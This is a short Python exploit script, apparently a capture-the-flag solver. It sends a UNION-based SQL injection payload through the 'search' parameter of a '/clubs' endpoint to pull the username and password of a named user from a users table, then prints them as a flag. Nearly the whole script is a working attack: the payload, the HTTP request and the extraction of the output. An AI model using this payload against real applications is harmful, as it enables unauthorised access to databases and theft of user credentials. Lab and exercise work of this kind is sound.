#!/usr/bin/env python3
import sys
import json
import urllib.parse
import requests

def main():
    if len(sys.argv) < 3:
        return

    host = sys.argv[1]
    port = sys.argv[2]
    target_url = f"http://{host}:{port}/clubs"

    # SQL Injection Payload
    payload = "' UNION SELECT 1, 'dummy', username, password, 'dummy' FROM users WHERE username='security_kim' -- "
    query = urllib.parse.quote(payload)

    try:
        response = requests.get(f"{target_url}?search={query}", timeout=10)

        if response.status_code == 200:
            data = response.json()
            rows = data.get("data", [])

            if rows:
                flag = rows[0].get("description", "")
                print(json.dumps({"flag": flag}))
    except:
        pass

if __name__ == "__main__":
    main()
